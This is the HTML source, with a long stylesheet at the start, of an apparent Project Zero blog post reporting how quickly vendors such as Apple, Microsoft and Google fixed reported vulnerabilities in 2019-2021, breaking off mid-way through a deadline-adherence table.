"}.lst-kix_p008n8rtcs1c-6&gt;li:before{content:"" counter(lst-ctn-kix_p008n8rtcs1c-6,decimal) ". "}.lst-kix_p008n8rtcs1c-1&gt;li{counter-increment:lst-ctn-kix_p008n8rtcs1c-1}.lst-kix_p008n8rtcs1c-5&gt;li:before{content:"(" counter(lst-ctn-kix_p008n8rtcs1c-5,lower-roman) ") "}ul.lst-kix_9x4uh3knfz5m-2{list-style-type:none}ul.lst-kix_9x4uh3knfz5m-1{list-style-type:none}ul.lst-kix_9x4uh3knfz5m-0{list-style-type:none}ul.lst-kix_9x4uh3knfz5m-6{list-style-type:none}ul.lst-kix_9x4uh3knfz5m-5{list-style-type:none}.lst-kix_sr4t049r1bof-1&gt;li{counter-increment:lst-ctn-kix_sr4t049r1bof-1}ul.lst-kix_9x4uh3knfz5m-4{list-style-type:none}ul.lst-kix_9x4uh3knfz5m-3{list-style-type:none}ol.lst-kix_sr4t049r1bof-6{list-style-type:none}ol.lst-kix_sr4t049r1bof-5{list-style-type:none}.lst-kix_p008n8rtcs1c-0&gt;li{counter-increment:lst-ctn-kix_p008n8rtcs1c-0}ol.lst-kix_sr4t049r1bof-4{list-style-type:none}ol.lst-kix_sr4t049r1bof-3{list-style-type:none}ol.lst-kix_sr4t049r1bof-8{list-style-type:none}ol.lst-kix_sr4t049r1bof-5.start{counter-reset:lst-ctn-kix_sr4t049r1bof-5 0}ol.lst-kix_sr4t049r1bof-7{list-style-type:none}.lst-kix_p008n8rtcs1c-2&gt;li{counter-increment:lst-ctn-kix_p008n8rtcs1c-2}.lst-kix_sr4t049r1bof-2&gt;li{counter-increment:lst-ctn-kix_sr4t049r1bof-2}ol.lst-kix_p008n8rtcs1c-2.start{counter-reset:lst-ctn-kix_p008n8rtcs1c-2 0}ol.lst-kix_sr4t049r1bof-8.start{counter-reset:lst-ctn-kix_sr4t049r1bof-8 0}ul.lst-kix_9x4uh3knfz5m-8{list-style-type:none}ul.lst-kix_9x4uh3knfz5m-7{list-style-type:none}.lst-kix_rpco0oapapnv-1&gt;li:before{content:"\0025cb  "}ul.lst-kix_7tz9dwqwiu1-5{list-style-type:none}ul.lst-kix_7tz9dwqwiu1-6{list-style-type:none}ul.lst-kix_7tz9dwqwiu1-7{list-style-type:none}ul.lst-kix_7tz9dwqwiu1-8{list-style-type:none}.lst-kix_rpco0oapapnv-2&gt;li:before{content:"\0025a0  "}ul.lst-kix_7tz9dwqwiu1-1{list-style-type:none}ul.lst-kix_7tz9dwqwiu1-2{list-style-type:none}ul.lst-kix_7tz9dwqwiu1-3{list-style-type:none}ul.lst-kix_7tz9dwqwiu1-4{list-style-type:none}.lst-kix_rpco0oapapnv-3&gt;li:before{content:"\0025cf  "}ul.lst-kix_7tz9dwqwiu1-0{list-style-type:none}.lst-kix_rpco0oapapnv-4&gt;li:before{content:"\0025cb  "}.lst-kix_rpco0oapapnv-6&gt;li:before{content:"\0025cf  "}.lst-kix_rpco0oapapnv-5&gt;li:before{content:"\0025a0  "}.lst-kix_9x4uh3knfz5m-7&gt;li:before{content:"\0025cb  "}.lst-kix_9x4uh3knfz5m-8&gt;li:before{content:"\0025a0  "}.lst-kix_9x4uh3knfz5m-5&gt;li:before{content:"\0025a0  "}.lst-kix_9x4uh3knfz5m-3&gt;li:before{content:"\0025cf  "}.lst-kix_9x4uh3knfz5m-4&gt;li:before{content:"\0025cb  "}ol.lst-kix_p008n8rtcs1c-8.start{counter-reset:lst-ctn-kix_p008n8rtcs1c-8 0}.lst-kix_9x4uh3knfz5m-2&gt;li:before{content:"\0025a0  "}.lst-kix_sr4t049r1bof-4&gt;li{counter-increment:lst-ctn-kix_sr4t049r1bof-4}.lst-kix_p008n8rtcs1c-4&gt;li{counter-increment:lst-ctn-kix_p008n8rtcs1c-4}.lst-kix_rpco0oapapnv-0&gt;li:before{content:"\0025cf  "}.lst-kix_sr4t049r1bof-8&gt;li{counter-increment:lst-ctn-kix_sr4t049r1bof-8}.lst-kix_9x4uh3knfz5m-6&gt;li:before{content:"\0025cf  "}ul.lst-kix_rpco0oapapnv-6{list-style-type:none}ul.lst-kix_rpco0oapapnv-7{list-style-type:none}ul.lst-kix_rpco0oapapnv-8{list-style-type:none}ul.lst-kix_rpco0oapapnv-2{list-style-type:none}ul.lst-kix_rpco0oapapnv-3{list-style-type:none}ol.lst-kix_p008n8rtcs1c-0{list-style-type:none}ul.lst-kix_rpco0oapapnv-4{list-style-type:none}ul.lst-kix_rpco0oapapnv-5{list-style-type:none}ol.lst-kix_sr4t049r1bof-3.start{counter-reset:lst-ctn-kix_sr4t049r1bof-3 0}ol.lst-kix_p008n8rtcs1c-7.start{counter-reset:lst-ctn-kix_p008n8rtcs1c-7 0}li.li-bullet-0:before{margin-left:-18pt;white-space:nowrap;display:inline-block;min-width:18pt}.lst-kix_ygk8qly5wagc-4&gt;li:before{content:"\0025cb  "}.lst-kix_9x4uh3knfz5m-0&gt;li:before{content:"\0025cf  "}.lst-kix_ygk8qly5wagc-3&gt;li:before{content:"\0025cf  "}.lst-kix_ygk8qly5wagc-5&gt;li:before{content:"\0025a0  "}.lst-kix_p008n8rtcs1c-0&gt;li:before{content:"" counter(lst-ctn-kix_p008n8rtcs1c-0,decimal) ") "}.lst-kix_p008n8rtcs1c-2&gt;li:before{content:"" counter(lst-ctn-kix_p008n8rtcs1c-2,lower-roman) ") "}.lst-kix_9x4uh3knfz5m-1&gt;li:before{content:"\0025cb  "}.lst-kix_p008n8rtcs1c-3&gt;li:before{content:"(" counter(lst-ctn-kix_p008n8rtcs1c-3,decimal) ") "}.lst-kix_ygk8qly5wagc-0&gt;li:before{content:"\0025cf  "}ol.lst-kix_p008n8rtcs1c-2{list-style-type:none}ol.lst-kix_p008n8rtcs1c-1{list-style-type:none}.lst-kix_ygk8qly5wagc-1&gt;li:before{content:"\0025cb  "}ol.lst-kix_p008n8rtcs1c-4{list-style-type:none}ul.lst-kix_rpco0oapapnv-0{list-style-type:none}ol.lst-kix_p008n8rtcs1c-3{list-style-type:none}ul.lst-kix_rpco0oapapnv-1{list-style-type:none}.lst-kix_ygk8qly5wagc-2&gt;li:before{content:"\0025a0  "}ol.lst-kix_p008n8rtcs1c-6{list-style-type:none}ol.lst-kix_p008n8rtcs1c-5{list-style-type:none}ol.lst-kix_p008n8rtcs1c-8{list-style-type:none}.lst-kix_p008n8rtcs1c-1&gt;li:before{content:"" counter(lst-ctn-kix_p008n8rtcs1c-1,lower-latin) ") "}ol.lst-kix_p008n8rtcs1c-1.start{counter-reset:lst-ctn-kix_p008n8rtcs1c-1 0}ol.lst-kix_p008n8rtcs1c-7{list-style-type:none}ol{margin:0;padding:0}table td,table th{padding:0}.c6{border-right-style:solid;padding:2pt 2pt 2pt 2pt;border-bottom-color:#cccccc;border-top-width:1pt;border-right-width:1pt;border-left-color:#cccccc;vertical-align:bottom;border-right-color:#cccccc;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:112.5pt;border-top-color:#cccccc;border-bottom-style:solid}.c3{border-right-style:solid;padding:2pt 2pt 2pt 2pt;border-bottom-color:#cccccc;border-top-width:1pt;border-right-width:1pt;border-left-color:#cccccc;vertical-align:bottom;border-right-color:#cccccc;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:60pt;border-top-color:#cccccc;border-bottom-style:solid}.c32{border-right-style:solid;padding:2pt 2pt 2pt 2pt;border-bottom-color:#cccccc;border-top-width:1pt;border-right-width:1pt;border-left-color:#cccccc;vertical-align:bottom;border-right-color:#cccccc;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:33pt;border-top-color:#cccccc;border-bottom-style:solid}.c28{border-right-style:solid;padding:2pt 2pt 2pt 2pt;border-bottom-color:#cccccc;border-top-width:1pt;border-right-width:1pt;border-left-color:#cccccc;vertical-align:bottom;border-right-color:#cccccc;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:93.8pt;border-top-color:#cccccc;border-bottom-style:solid}.c21{border-right-style:solid;padding:2pt 2pt 2pt 2pt;border-bottom-color:#cccccc;border-top-width:1pt;border-right-width:1pt;border-left-color:#cccccc;vertical-align:bottom;border-right-color:#cccccc;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:115.5pt;border-top-color:#cccccc;border-bottom-style:solid}.c12{border-right-style:solid;padding:2pt 2pt 2pt 2pt;border-bottom-color:#cccccc;border-top-width:1pt;border-right-width:1pt;border-left-color:#cccccc;vertical-align:bottom;border-right-color:#cccccc;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:90.8pt;border-top-color:#cccccc;border-bottom-style:solid}.c16{border-right-style:solid;padding:2pt 2pt 2pt 2pt;border-bottom-color:#cccccc;border-top-width:1pt;border-right-width:1pt;border-left-color:#cccccc;vertical-align:bottom;border-right-color:#cccccc;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:74.2pt;border-top-color:#cccccc;border-bottom-style:solid}.c14{border-right-style:solid;padding:2pt 2pt 2pt 2pt;border-bottom-color:#cccccc;border-top-width:1pt;border-right-width:1pt;border-left-color:#cccccc;vertical-align:bottom;border-right-color:#cccccc;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:96.8pt;border-top-color:#cccccc;border-bottom-style:solid}.c10{border-right-style:solid;padding:2pt 2pt 2pt 2pt;border-bottom-color:#cccccc;border-top-width:1pt;border-right-width:1pt;border-left-color:#cccccc;vertical-align:bottom;border-right-color:#cccccc;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:57.8pt;border-top-color:#cccccc;border-bottom-style:solid}.c23{border-right-style:solid;padding:2pt 2pt 2pt 2pt;border-bottom-color:#cccccc;border-top-width:1pt;border-right-width:1pt;border-left-color:#cccccc;vertical-align:bottom;border-right-color:#cccccc;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:49.5pt;border-top-color:#cccccc;border-bottom-style:solid}.c15{border-right-style:solid;padding:2pt 2pt 2pt 2pt;border-bottom-color:#cccccc;border-top-width:1pt;border-right-width:1pt;border-left-color:#cccccc;vertical-align:bottom;border-right-color:#cccccc;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:75pt;border-top-color:#cccccc;border-bottom-style:solid}.c5{border-right-style:solid;padding:2pt 2pt 2pt 2pt;border-bottom-color:#cccccc;border-top-width:1pt;border-right-width:1pt;border-left-color:#cccccc;vertical-align:top;border-right-color:#cccccc;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:93pt;border-top-color:#cccccc;border-bottom-style:solid}.c25{border-right-style:solid;padding:2pt 2pt 2pt 2pt;border-bottom-color:#cccccc;border-top-width:1pt;border-right-width:1pt;border-left-color:#cccccc;vertical-align:top;border-right-color:#cccccc;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:96pt;border-top-color:#cccccc;border-bottom-style:solid}.c19{border-right-style:solid;padding:2pt 2pt 2pt 2pt;border-bottom-color:#cccccc;border-top-width:1pt;border-right-width:1pt;border-left-color:#cccccc;vertical-align:bottom;border-right-color:#cccccc;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:73.5pt;border-top-color:#cccccc;border-bottom-style:solid}.c22{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:9pt;font-family:"Arial";font-style:italic}.c2{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:left;height:10pt}.c11{padding-top:16pt;padding-bottom:4pt;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.c33{color:#434343;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:13pt;font-family:"Arial";font-style:normal}.c31{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:15pt;font-family:"Arial";font-style:normal}.c4{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:10pt;font-family:"Arial";font-style:normal}.c29{padding-top:20pt;padding-bottom:6pt;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.c27{padding-top:0pt;padding-bottom:0pt;line-height:1.0;orphans:2;widows:2;text-align:left}.c0{padding-top:0pt;padding-bottom:0pt;line-height:1.0;orphans:2;widows:2;text-align:right}.c26{color:#000000;text-decoration:none;vertical-align:baseline;font-size:10pt;font-family:"Arial";font-style:normal}.c42{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:10pt;font-family:"Arial"}.c8{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:left}.c9{padding-top:0pt;padding-bottom:0pt;line-height:1.5;text-align:left}.c13{border-spacing:0;border-collapse:collapse;margin-right:auto}.c17{text-decoration-skip-ink:none;-webkit-text-decoration-skip:none;color:#1155cc;text-decoration:underline}.c1{padding-top:0pt;padding-bottom:0pt;line-height:1.5;text-align:right}.c34{background-color:#ffffff;max-width:468pt;padding:72pt 72pt 72pt 72pt}.c30{margin-left:36pt;padding-left:0pt}.c41{padding:0;margin:0}.c20{color:inherit;text-decoration:inherit}.c39{font-size:9pt}.c24{height:0pt}.c18{height:15.8pt}.c35{height:10pt}.c36{height:28.5pt}.c40{height:17.2pt}.c37{font-style:italic}.c7{font-weight:700}.c38{height:39.8pt}.title{padding-top:0pt;color:#000000;font-size:26pt;padding-bottom:3pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.subtitle{padding-top:0pt;color:#666666;font-size:15pt;padding-bottom:16pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}li{color:#000000;font-size:10pt;font-family:"Arial"}p{margin:0;color:#000000;font-size:10pt;font-family:"Arial"}h1{padding-top:20pt;color:#000000;font-size:15pt;padding-bottom:6pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h2{padding-top:18pt;color:#000000;font-size:16pt;padding-bottom:6pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h3{padding-top:16pt;color:#434343;font-size:13pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h4{padding-top:14pt;color:#666666;font-size:12pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h5{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h6{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;font-style:italic;orphans:2;widows:2;text-align:left}&lt;/style&gt;&lt;/head&gt;&lt;body class="c34"&gt; &lt;p class="c8"&gt;&lt;span class="c4"&gt;Posted by Ryan Schoen, Project Zero&lt;/span&gt;&lt;/p&gt;&lt;h1 class="c29" id="h.xo66zodpzj4v"&gt;&lt;span class="c31"&gt;tl;dr&lt;/span&gt;&lt;/h1&gt;&lt;ul style="padding: 0;" class="c41 lst-kix_rpco0oapapnv-0 start"&gt;&lt;li style="margin-left: 46pt;" class="c8 c30 li-bullet-0"&gt;&lt;span class="c4"&gt;In 2021, vendors took an average of 52 days to fix security vulnerabilities reported from Project Zero. This is a significant acceleration from an average of about 80 days 3 years ago.&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c8 c30 li-bullet-0"&gt;&lt;span&gt;In addition to the average now being well below the &lt;/span&gt;&lt;span class="c17"&gt;&lt;a class="c201" href="https://googleprojectzero.blogspot.com/p/vulnerability-disclosure-faq.html"&gt;90-day deadline&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, we have also seen a dropoff in vendors missing the deadline (or the additional &lt;/span&gt;&lt;span class="c17"&gt;&lt;a class="c201" href="https://googleprojectzero.blogspot.com/p/vulnerability-disclosure-faq.html#deadlinemiss"&gt;14-day grace period&lt;/a&gt;&lt;/span&gt;&lt;span&gt;). &lt;/span&gt;&lt;span&gt;In 2021, only one bug exceeded its fix deadline, though 14% of bugs required the grace period.&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c8 c30 li-bullet-0"&gt;&lt;span class="c4"&gt;Differences in the amount of time it takes a vendor/product to ship a fix to users reflects their product design, development practices, update cadence, and general processes towards security reports. We hope that this comparison can showcase best practices, and encourage vendors to experiment with new policies.&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c8 c30 li-bullet-0"&gt;&lt;span&gt;This &lt;/span&gt;&lt;span&gt;data&lt;/span&gt;&lt;span class="c4"&gt;&amp;nbsp;aggregation and analysis is relatively new for Project Zero, but we hope to do it more in the future. We encourage all vendors to consider publishing aggregate data on their time-to-fix and time-to-patch for externally reported vulnerabilities, as well as more data sharing and transparency in general.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt; &lt;p class="c2"&gt;&lt;span class="c4"&gt;&lt;/span&gt;&lt;/p&gt;&lt;h1 class="c29" id="h.pta8ps9u6b3h"&gt;&lt;span class="c31"&gt;Overview&lt;/span&gt;&lt;/h1&gt; &lt;p class="c8"&gt;&lt;span&gt;For nearly ten years, Google&amp;rsquo;s Project Zero has been working to &lt;/span&gt;&lt;span&gt;make it more difficult for bad actors to find and &lt;/span&gt;&lt;span class="c4"&gt;exploit security vulnerabilities, significantly improving the security of the Internet for everyone. In that time, we have partnered with folks across industry to transform the way organizations prioritize and approach fixing security vulnerabilities and updating people&amp;rsquo;s software.&lt;/span&gt;&lt;/p&gt; &lt;p class="c2"&gt;&lt;span class="c4"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c8"&gt;&lt;span&gt;To help contextualize the shifts we are seeing the ecosystem make, we &lt;/span&gt;&lt;span&gt;looked back at the set of vulnerabilities Project Zero has been reporting, how a range of vendors have been responding to them, and then attempted to identify trends in this &lt;/span&gt;&lt;span&gt;data&lt;/span&gt;&lt;span&gt;, such as how the industry as a whole is patching vulnerabilities faster.&lt;/span&gt;&lt;/p&gt; &lt;p class="c2"&gt;&lt;span class="c4"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c8"&gt;&lt;span&gt;For this post, we look at fixed bugs that were reported between January 2019 and December 2021 &lt;/span&gt;&lt;span class="c37"&gt;(2019 is the year we made changes to our disclosure policies and also began recording more detailed metrics on our reported bugs).&lt;/span&gt;&lt;span&gt;&amp;nbsp;The data we&amp;#39;ll be referencing is publicly available on the &lt;/span&gt;&lt;span class="c17"&gt;&lt;a class="c201" href="https://bugs.chromium.org/p/project-zero/issues/list"&gt;Project Zero Bug Tracker&lt;/a&gt;&lt;/span&gt;&lt;span class="c4"&gt;, and on various open source project repositories (in the case of the data used below to track the timeline of open-source browser bugs). &lt;/span&gt;&lt;/p&gt; &lt;p class="c2"&gt;&lt;span class="c4"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c8"&gt;&lt;span class="c4"&gt;There are a number of caveats with our data, the largest being that we&amp;#39;ll be looking at a small number of samples, so differences in numbers may or may not be statistically significant. Also, the direction of Project Zero&amp;#39;s research is almost entirely influenced by the choices of individual researchers, so changes in our research targets could shift metrics as much as changes in vendor behaviors could. As much as possible, this post is designed to be an objective presentation of the data, with additional subjective analysis included at the end.&lt;/span&gt;&lt;/p&gt;&lt;h1 class="c29" id="h.1d9pvkaiez8g"&gt;&lt;span class="c31"&gt;The data!&lt;/span&gt;&lt;/h1&gt; &lt;p class="c8"&gt;&lt;span&gt;Between 2019 and 2021, Project Zero reported &lt;/span&gt;&lt;span class="c17"&gt;&lt;a class="c201" href="https://bugs.chromium.org/p/project-zero/issues/list?sort=id&amp;colspec=ID%20Status%20Restrict%20Finder%20Reported%20Deadline%20Remaining%20CVE%20Vendor%20Product%20Summary&amp;q=status%21%3DInvalid%20id%3E%3D1748%20id%3C%3D2248%20Deadline%3A90&amp;can=1"&gt;376 issues&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;to vendors under our standard 90-day deadline. 351 (93.4%) of these bugs have been fixed, while 14 (3.7%) have been marked &lt;/span&gt;&lt;span&gt;as WontFix by the vendor&lt;/span&gt;&lt;span&gt;s. &lt;/span&gt;&lt;span&gt;11 (2.9%) other bugs remain unfixed, though at the time of this writing 8 have passed their deadline to be fixed; the remaining 3 are still within their deadline to be fixed.&lt;/span&gt;&lt;span&gt;&amp;nbsp;Most of the vulnerabilities are clustered around a few vendors, with 96 bugs (26%) being reported to &lt;/span&gt;&lt;span&gt;Microsoft, 85 (23%) to Apple, and 60 (16%) to Google. &lt;/span&gt;&lt;/p&gt;&lt;h1 class="c29" id="h.sv8ualubd8u5"&gt;&lt;span class="c31"&gt;Deadline adherence&lt;/span&gt;&lt;/h1&gt; &lt;p class="c8"&gt;&lt;span&gt;Once a vendor receives a bug report under&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c4"&gt;our standard deadline, they have 90 days to fix it and ship a patched version to the public. The vendor can also request a 14-day grace period if the vendor confirms they plan to release the fix by the end of that total 104-day window. &lt;/span&gt;&lt;/p&gt; &lt;p class="c2"&gt;&lt;span class="c4"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c8"&gt;&lt;span class="c4"&gt;In this section, we&amp;#39;ll be taking a look at how often vendors are able to hit these deadlines. The table below includes all bugs that have been reported to the vendor under the 90-day deadline since January 2019 and have since been fixed, for vendors with the most bug reports in the window.&lt;/span&gt;&lt;/p&gt;&lt;h3 class="c11" id="h.fg01dvnui56v"&gt;&lt;span class="c33"&gt;Deadline adherence and fix time 2019-2021, by bug report volume&lt;/span&gt;&lt;/h3&gt;&lt;a id="t.329fd0452dc36b64883666563f4a8e1faf166602"&gt;&lt;/a&gt;&lt;a id="t.0"&gt;&lt;/a&gt;&lt;table class="c13"&gt;&lt;tbody&gt;&lt;tr class="c38"&gt;&lt;td class="c23" colspan="1" rowspan="1"&gt; &lt;p class="c9"&gt;&lt;span class="c7"&gt;Vendor&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c10" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c7"&gt;Total bugs&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c12" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c7"&gt;Fixed by day 90&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c14" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c7"&gt;Fixed during&lt;br&gt;grace period&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c14" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c26 c7"&gt;Exceeded deadline&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c7"&gt;&amp;amp; grace period&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c16" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c7"&gt;Avg days to fix&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class="c18"&gt;&lt;td class="c23" colspan="1" rowspan="1"&gt; &lt;p class="c9"&gt;&lt;span class="c4"&gt;Apple&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c10" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c4"&gt;84&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c12" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c4"&gt;73 (87%)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c14" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c4"&gt;7 (8%)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c14" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c4"&gt;4 (5%)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c16" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c4"&gt;69&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class="c18"&gt;&lt;td class="c23" colspan="1" rowspan="1"&gt; &lt;p class="c9"&gt;&lt;span class="c4"&gt;Microsoft&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c10" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c4"&gt;80&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c12" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c4"&gt;61 (76%)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c14" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c4"&gt;15 (19%)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c14" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c4"&gt;4 (5%)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c16" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c4"&gt;83&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class="c18"&gt;&lt;td class="c23" colspan="1" rowspan="1"&gt; &lt;p class="c9"&gt;&lt;span class="c4"&gt;Google&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c10" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c4"&gt;56&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c12" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c4"&gt;53 (95%)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c14" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c4"&gt;2 (4%)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c14" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c4"&gt;1 (2%)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c16" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c4"&gt;44&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class="c18"&gt;&lt;td class="c23" colspan="1" rowspan="1"&gt; &lt;p class="c9"&gt;&lt;span class="c4"&gt;Linux&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c10" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c4"&gt;25&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c12" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c4"&gt;24 (96%)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c14" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c4"&gt;0 (0%)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c14" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c4"&gt;1 (4%)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c16" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c4"&gt;25&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class="c18"&gt;&lt;td class="c23" colspan="1" rowspan="1"&gt; &lt;p class="c9"&gt;&lt;span class="c4"&gt;Adobe&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c10" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c4"&gt;19&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c12" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c4"&gt;15 (79%)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c14" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c4"&gt;4 (21%)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c14" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c4"&gt;0 (0%)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c16" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c4"&gt;65&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class="c18"&gt;&lt;td class="c23" colspan="1" rowspan="1"&gt; &lt;p class="c9"&gt;&lt;span class="c4"&gt;Mozilla&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c10" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c4"&gt;10&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c12" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c4"&gt;9 (90%)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c14" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c4"&gt;1 (10%)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c14" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c4"&gt;0 